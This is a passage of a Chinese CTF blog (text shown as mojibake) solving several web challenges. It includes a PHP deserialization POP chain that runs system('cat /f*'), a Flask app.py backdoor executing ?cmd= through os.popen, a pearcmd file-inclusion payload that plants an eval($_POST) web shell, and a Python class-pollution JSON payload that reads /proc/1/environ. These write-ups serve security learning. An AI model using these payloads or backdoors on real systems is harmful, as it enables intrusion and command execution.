class="variable">$obj</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$wel</span> = <span class="variable language_">$this</span>-&gt;obj-&gt;good;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;NewStar&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Misc</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">evil</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;good job but nothing&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = @<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;fast&#x27;</span>]);</span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;Nope&quot;</span>); </span><br></pre></td></tr></table></figure>

<p>åˆ†æä¸€ä¸‹ï¼Œå¤§è‡´çš„popé“¾å¦‚ä¸‹ï¼š</p>
<p><code>Start::__destruct()</code> -&gt; <code>Crypto::__toString()</code> -&gt; <code>Reverse::__get()</code> -&gt; <code>Pwn::__invoke()</code> -&gt; <code>Web::__evil</code></p>
<p>ä¸è¿‡æœ‰ä¸ªé—®é¢˜ï¼Œdieä¼šä½¿æ•´ä¸ªå‡½æ•°åœæ­¢è¿è½¬ï¼Œè¯´æ˜æˆ‘ä»¬è¿˜éœ€è¦æ³¨æ„ç»•è¿‡ä¸€ä¸‹</p>
<p>è¿™é‡Œçš„throwæ¶‰åŠåˆ°åƒåœ¾å›æ”¶æœºåˆ¶ï¼ˆGCå›æ”¶ï¼‰</p>
<p>åœ¨phpä¸­ï¼Œå½“å¯¹è±¡è¢«é”€æ¯æ—¶ä¼šè‡ªåŠ¨è°ƒç”¨<code>__destruct()</code>ï¼Œä½†å¦‚æœç¨‹åºæŠ¥é”™æˆ–è€…æŠ›å‡ºå¼‚å¸¸ï¼Œå°±ä¸ä¼šè§¦å‘è¯¥é­”æœ¯æ–¹æ³•ã€‚</p>
<p>å½“ä¸€ä¸ªç±»åˆ›å»ºä¹‹åå®ƒä¼šè‡ªå·±æ¶ˆå¤±ï¼Œè€Œ <code>__destruct()</code>çš„è§¦å‘æ¡ä»¶å°±æ˜¯ä¸€ä¸ªç±»è¢«é”€æ¯æ—¶è§¦å‘ï¼Œthrowå›æ”¶äº†è‡ªåŠ¨é”€æ¯çš„ç±»ï¼Œå¯¼è‡´<code>__destruct()</code>æ£€æµ‹ä¸åˆ°æœ‰ä¸œè¥¿é”€æ¯ï¼Œä»è€Œæ— æ³•è§¦å‘<code>__destruct()</code>ã€‚</p>
<p>æ ¹æ®è¿™ä¸ªç‰¹æ€§ï¼Œæˆ‘ä»¬å¯ä»¥æå‰è§¦å‘GCå›æ”¶æ¥æŠ›å‡ºå¼‚å¸¸ï¼Œä»è€Œè°ƒç”¨<code>__destruct()</code>ã€‚</p>
<p>è¿™é‡Œå¯ä»¥ä½¿æ•°ç»„å¯¹è±¡ä¸ºNULLï¼Œè¿™æ ·å°±èƒ½æå‰è§¦å‘throw</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Start</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$errMsg</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="variable language_">$this</span>-&gt;errMsg);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pwn</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$obj</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;obj-&gt;<span class="title function_ invoke__">evil</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">evil</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Reverse</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$var</span></span>) </span>&#123;</span><br><span class="line">        (<span class="variable language_">$this</span>-&gt;func)();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Web</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span>=<span class="string">&#x27;system&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var</span>=<span class="string">&#x27;cat /f*&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">evil</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/i&quot;</span>,<span class="variable">$this</span>-&gt;<span class="keyword">var</span>))&#123;</span><br><span class="line">            (<span class="variable language_">$this</span>-&gt;func)(<span class="variable language_">$this</span>-&gt;<span class="keyword">var</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Not Flag&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Crypto</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$obj</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$wel</span> = <span class="variable language_">$this</span>-&gt;obj-&gt;good;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;NewStar&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$start</span> = <span class="keyword">new</span> <span class="title class_">Start</span>();</span><br><span class="line"><span class="variable">$pwn</span> = <span class="keyword">new</span> <span class="title class_">Pwn</span>();</span><br><span class="line"><span class="variable">$crypto</span> = <span class="keyword">new</span> <span class="title class_">Crypto</span>();</span><br><span class="line"><span class="variable">$web</span> = <span class="keyword">new</span> <span class="title class_">Web</span>();</span><br><span class="line"><span class="variable">$reverse</span> = <span class="keyword">new</span> <span class="title class_">Reverse</span>();</span><br><span class="line"><span class="variable">$start</span>-&gt;errMsg = <span class="variable">$crypto</span>;</span><br><span class="line"><span class="variable">$crypto</span>-&gt;obj = <span class="variable">$reverse</span>;</span><br><span class="line"><span class="variable">$reverse</span>-&gt;func = <span class="variable">$pwn</span>;</span><br><span class="line"><span class="variable">$pwn</span>-&gt;obj = <span class="variable">$web</span>;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">array</span>(<span class="variable">$start</span>,<span class="number">0</span>);</span><br><span class="line"><span class="keyword">echo</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>å¾—åˆ°<code>a:2:&#123;i:0;O:5:&quot;Start&quot;:1:&#123;s:6:&quot;errMsg&quot;;O:6:&quot;Crypto&quot;:1:&#123;s:3:&quot;obj&quot;;O:7:&quot;Reverse&quot;:1:&#123;s:4:&quot;func&quot;;O:3:&quot;Pwn&quot;:1:&#123;s:3:&quot;obj&quot;;O:3:&quot;Web&quot;:2:&#123;s:4:&quot;func&quot;;s:6:&quot;system&quot;;s:3:&quot;var&quot;;s:7:&quot;cat /f*&quot;;&#125;&#125;&#125;&#125;&#125;i:1;i:0;&#125;</code>åæŠŠ<code>i:1</code>æ”¹ä¸º<code>i:0</code>ï¼Œè¿™æ ·å°±ä»£è¡¨æ•°ç»„å¯¹è±¡ä¸ºç©ºï¼Œä¼šè§¦å‘throwï¼Œå…¶ä»–å°±æ­£å¸¸æ‰§è¡Œäº† </p>
<h1 id="NewStarCTF-2023-å…¬å¼€èµ›é“-flask-disk"><a href="#NewStarCTF-2023-å…¬å¼€èµ›é“-flask-disk" class="headerlink" title="[NewStarCTF 2023 å…¬å¼€èµ›é“]flask disk"></a>[NewStarCTF 2023 å…¬å¼€èµ›é“]flask disk</h1><p><code>admin manage</code>ä¸€æ éœ€è¦æˆ‘ä»¬è¾“å…¥pinç ï¼Œè¯´æ˜flaskå¼€å¯äº†debugæ¨¡å¼ï¼Œè¿›è€Œè¯´æ˜app.pyåœ¨è¢«ä¿®æ”¹åä¼šç«‹åˆ»åŠ è½½ï¼Œæˆ‘ä»¬é‡æ–°ç¼–å†™ä¸€ä¸ªapp.pyä¸Šä¼ rceå³å¯</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,request</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():    </span><br><span class="line">    <span class="keyword">try</span>:        </span><br><span class="line">        cmd = request.args.get(<span class="string">&#x27;cmd&#x27;</span>)        </span><br><span class="line">        data = os.popen(cmd).read()        </span><br><span class="line">        <span class="keyword">return</span> data    </span><br><span class="line">    <span class="keyword">except</span>:        </span><br><span class="line">        <span class="keyword">pass</span>            </span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;1&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:    </span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">5000</span>,debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>

<img src="/2024/03/29/buuctf/buu2/image-20240424200429359.png" class="" title="image-20240424200429359">

<h1 id="DASCTF-2023-amp-0X401ä¸ƒæœˆæš‘æœŸæŒ‘æˆ˜èµ›-ez-cms"><a href="#DASCTF-2023-amp-0X401ä¸ƒæœˆæš‘æœŸæŒ‘æˆ˜èµ›-ez-cms" class="headerlink" title="[DASCTF 2023 &amp; 0X401ä¸ƒæœˆæš‘æœŸæŒ‘æˆ˜èµ›]ez_cms"></a>[DASCTF 2023 &amp; 0X401ä¸ƒæœˆæš‘æœŸæŒ‘æˆ˜èµ›]ez_cms</h1><p>æ ¹æ®cmsçš„ç‰ˆæœ¬å’Œç±»å‹ï¼Œå¾ˆå®¹æ˜“æ‰¾åˆ°å¯¹åº”é¶åœº</p>
<p>çœ‹äº†ç›¸å…³ä»‹ç»ï¼Œå‘ç°cmså­˜åœ¨è¶Šæƒæ¼æ´ä»¥åŠsqlæ³¨å…¥ï¼ˆå…¶å®å¼±å¯†ç ä¹Ÿæœ‰ï¼‰</p>
<p>è®¿é—®<code>/admin</code>ç™»å½•</p>
<img src="/2024/03/29/buuctf/buu2/image-20240425153341132.png" class="" title="image-20240425153341132">

<p>ä¹‹å‰åœ¨ç™»é™†çš„æ—¶å€™è¯•äº†è¯•æ–‡ä»¶åŒ…å«ï¼Œä½†æ˜¯æ²¡æœ‰ååº”ï¼Œæ¨æµ‹æ˜¯æœ‰è¿‡æ»¤æˆ–è€…ä¿®æ”¹äº†æ–‡ä»¶æƒé™ä»€ä¹ˆçš„ï¼Ÿ</p>
<p>å°è¯•ä¸‹è½½index.php</p>
<img src="/2024/03/29/buuctf/buu2/image-20240425154031912.png" class="" title="image-20240425154031912">

<p>å¾—åˆ°ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//å•ä¸€å…¥å£æ¨¡å¼</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>); <span class="comment">//å…³é—­é”™è¯¯æ˜¾ç¤º</span></span><br><span class="line"><span class="variable">$file</span>=<span class="title function_ invoke__">addslashes</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;r&#x27;</span>]); <span class="comment">//æ¥æ”¶æ–‡ä»¶å</span></span><br><span class="line"><span class="variable">$action</span>=<span class="variable">$file</span>==<span class="string">&#x27;&#x27;</span>?<span class="string">&#x27;index&#x27;</span>:<span class="variable">$file</span>; <span class="comment">//åˆ¤æ–­ä¸ºç©ºæˆ–è€…ç­‰äºindex</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;files/&#x27;</span>.<span class="variable">$action</span>.<span class="string">&#x27;.php&#x27;</span>); <span class="comment">//è½½å…¥ç›¸åº”æ–‡ä»¶</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>æœç„¶å­˜åœ¨æ–‡ä»¶åŒ…å«ï¼Œä½†æ˜¯çŒœæµ‹flagå¹¶ä¸ä¼šå†™åœ¨phpæ–‡ä»¶é‡Œï¼Œæœ‰å¯èƒ½åœ¨ç¯å¢ƒå˜é‡æˆ–è€…æ ¹ç›®å½•é‡Œä»€ä¹ˆçš„ï¼Œå…ˆä¸å¤§è´¹å‘¨ç« åœ°æè¿™ä¸ª</p>
<p>çœ‹çœ‹èƒ½ä¸èƒ½ä¸‹è½½ç¯å¢ƒå˜é‡çš„å†…å®¹</p>
<img src="/2024/03/29/buuctf/buu2/image-20240425154430677.png" class="" title="image-20240425154430677">

<p>å‘ç°å¹¶ä¸è¡Œï¼Œæ„Ÿè§‰åƒæ˜¯æœ‰æƒé™æˆ–è€…æ”¹åç§°æˆ–è€…æ¢ç›®å½•ï¼Ÿ</p>
<p>åœ¨ä¹‹å‰çš„åå°ç³»ç»Ÿä¸­ï¼Œæˆ‘ä»¬å‘ç°äº†ä¸€ä¸ªä¸Šä¼ æ–‡ä»¶çš„ç‚¹ï¼Œçœ‹çœ‹èƒ½ä¸èƒ½ä¼ :horse:</p>
<img src="/2024/03/29/buuctf/buu2/image-20240425154923485.png" class="" title="image-20240425154923485">

<p>ä¼¼ä¹æ˜¯ä¸å¯è¡Œçš„ï¼ˆè¿™é‡Œæˆ‘æ˜¯æŠ“åŒ…æ”¹åç§°åæ‰ä¼ çš„:horse:ï¼Œç³»ç»Ÿå¯¹æ–‡ä»¶åç¼€åæœ‰æ£€æŸ¥ï¼‰</p>
<p>é‚£å°±åªæœ‰æ–‡ä»¶åŒ…å«äº†ï¼Œè¿™é‡Œç”¨pearï¼ˆæ€ä¹ˆæœ€è¿‘åšé¢˜åªè¦æœ‰æ–‡ä»¶åŒ…å«å°±æœ‰pearï¼‰</p>
<p>ä¹‹å‰è¯´è¿‡ï¼Œ<code>pearcmd.php</code>é»˜è®¤å®‰è£…åœ¨<code>/usr/local/lib/php</code></p>
<p>payloadå°±å¯ä»¥å¾ˆå¥½åœ°è¿›è¡Œæ„é€ äº†ï¼š<code>../../../../usr/share/php/pearcmd&amp;/&lt;?=eval($_POST[&#39;cmd&#39;]);?&gt;+/tmp/shell.php</code>ï¼ˆæ³¨æ„ä»£ç ä¸­includeæ˜¯è‡ªåŠ¨åŠ äº†åç¼€phpçš„ï¼‰</p>
<img src="/2024/03/29/buuctf/buu2/image-20240425155944343.png" class="" title="image-20240425155944343">

<p>ç„¶åå°±å¯ä»¥rceäº†</p>
<img src="/2024/03/29/buuctf/buu2/image-20240425160121697.png" class="" title="image-20240425160121697">

<h1 id="DASCTF-2023-amp-0X401ä¸ƒæœˆæš‘æœŸæŒ‘æˆ˜èµ›-EzFlask"><a href="#DASCTF-2023-amp-0X401ä¸ƒæœˆæš‘æœŸæŒ‘æˆ˜èµ›-EzFlask" class="headerlink" title="[DASCTF 2023 &amp; 0X401ä¸ƒæœˆæš‘æœŸæŒ‘æˆ˜èµ›]EzFlask"></a>[DASCTF 2023 &amp; 0X401ä¸ƒæœˆæš‘æœŸæŒ‘æˆ˜èµ›]EzFlask</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, session</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> black_list</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = <span class="built_in">str</span>(uuid.uuid4())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">data</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> black_list:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> data:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">user</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="variable language_">self</span>.username = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="variable language_">self</span>.password = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">self, data</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="variable language_">self</span>.username == data[<span class="string">&#x27;username&#x27;</span>] <span class="keyword">and</span> <span class="variable language_">self</span>.password == data[<span class="string">&#x27;password&#x27;</span>]:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">Users = []</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/register&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>():</span><br><span class="line">    <span class="keyword">if</span> request.data:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> check(request.data):</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;Register Failed&quot;</span></span><br><span class="line">            data = json.loads(request.data)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;username&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> data <span class="keyword">or</span> <span class="string">&quot;password&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> data:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;Register Failed&quot;</span></span><br><span class="line">            User = user()</span><br><span class="line">            merge(data, User)</span><br><span class="line">            Users.append(User)</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Register Failed&quot;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Register Success&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Register Failed&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    <span class="keyword">if</span> request.data:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            data = json.loads(request.data)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;username&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> data <span class="keyword">or</span> <span class="string">&quot;password&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> data:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;Login Failed&quot;</span></span><br><span class="line">            <span class="keyword">for</span> user <span class="keyword">in</span> Users:</span><br><span class="line">                <span class="keyword">if</span> user.check(data):</span><br><span class="line">                    session[<span class="string">&quot;username&quot;</span>] = data[<span class="string">&quot;username&quot;</span>]</span><br><span class="line">                    <span class="keyword">return</span> <span class="string">&quot;Login Success&quot;</span></span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Login Failed&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Login Failed&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(__file__, <span class="string">&quot;r&quot;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">5010</span>)</span><br></pre></td></tr></table></figure>

<p>å¾ˆæ˜æ˜¾çš„ä¸€ä¸ªåŸå‹é“¾æ±¡æŸ“</p>
<p>åœ¨è¿™é‡Œï¼Œ<code>open(__file__, &quot;r&quot;).read()</code>æ˜¯ç›´æ¥è¿”å›æœåŠ¡å™¨ä»£ç çš„ï¼Œæˆ‘ä»¬å¯ä»¥ä¿®æ”¹<code>__file__</code>æ¥é€ æˆä»»æ„æ–‡ä»¶çš„è¯»å–</p>
<p>è¿™é‡Œè¯»å–ç¯å¢ƒå˜é‡æ¥æ„é€ payloadï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	&quot;username&quot;:&quot;user&quot;,</span><br><span class="line">	&quot;password&quot;:&quot;pass&quot;,</span><br><span class="line">	&quot;__class__&quot;:&#123;</span><br><span class="line">		&quot;check&quot;:&#123;</span><br><span class="line">			&quot;__globals__&quot;:&#123;</span><br><span class="line">				&quot;__file__&quot;:&quot;proc/1/environ&quot;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

</div><div class="index-category-tag"><div class="level-item"><i class="fas fa-folder-open has-text-grey">Â </i><a class="article-more button is-small link-muted index-categories" href="/categories/buu%E5%B9%B3%E5%8F%B0/">buuå¹³å°</a></div>Â Â <hr></div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta size-small is-uppercase level is-mobile"><div class="level-left"><i class="far fa-calendar-plus">Â </i>2024-03-27Â Â <a class="commentCountImg" href="/2024/03/27/Scr1w-Platform/sssctf/#comment-container"><span class="display-none-class">0a3d545164c738481af6503a28e0ac03</span><i class="far fa-comment-dots"></i>Â <span class="commentCount" id="0a3d545164c738481af6503a28e0ac03">99+</span>Â Â </a><span class="level-item"><i class="far fa-clock">Â </i>2 åˆ†é’Ÿ Â <i class="fas fa-pencil-alt">Â </i>0.3Â k</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2024/03/27/Scr1w-Platform/sssctf/">å¹³å°åšé¢˜è®°å½•</a></h1><div class="content"><h2 id="ez-json"><a href="#ez-json" class="headerlink" title="*ez_json"></a>*ez_json</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span 